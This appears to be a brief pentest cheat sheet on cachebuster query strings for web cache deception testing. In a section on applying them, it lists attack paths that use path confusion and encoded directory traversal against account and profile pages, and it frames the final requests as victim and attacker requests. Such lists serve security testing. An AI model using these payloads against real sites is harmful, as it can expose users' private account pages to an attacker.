# Cachebuster Payloads

## Basic

```text
?wcd=001
```

```text
?wcd=002
```

```text
?wcd=003
```

---

## Numeric Cachebusters

```text
?cb=001
?cb=002
?cb=003
?cb=004
```

---

## Alphanumeric Cachebusters

```text
?wcd=a001
?wcd=a002
?wcd=b001
```

---

## Applied to WCD Payload

```text
/my-account/abc.js?cb=001
```

```text
/my-account;abc.js?cb=002
```

```text
/assets/..%2fprofile?cb=003
```

```text
/my-account;%2f%2e%2e%2frobots.txt?wcd=004
```

---

## Purpose

Use a different cachebuster for independent tests:

```text
Test 1 → ?wcd=001
Test 2 → ?wcd=002
Test 3 → ?wcd=003
```

This helps avoid previously cached responses affecting the test.

---

## Important

Query parameters are commonly included in the cache key.

Therefore:

```text
?wcd=001
```

and:

```text
?wcd=002
```

may represent different cache entries.

The final victim and attacker requests must use the same cache key.